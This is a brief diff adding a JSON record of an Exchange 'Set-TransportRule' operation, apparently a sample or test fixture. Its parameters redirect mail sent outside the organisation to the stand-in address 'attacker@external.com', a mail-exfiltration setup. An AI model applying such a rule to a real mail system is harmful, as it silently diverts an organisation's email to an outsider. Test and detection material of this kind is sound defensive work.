@@ -1,0 +1,7 @@
+{
+  "operation": "Set-TransportRule",
+  "parameters": {
+    "RedirectMessageTo": "attacker@external.com",
+    "SentToScope": "NotInOrganization"
+  }
+}
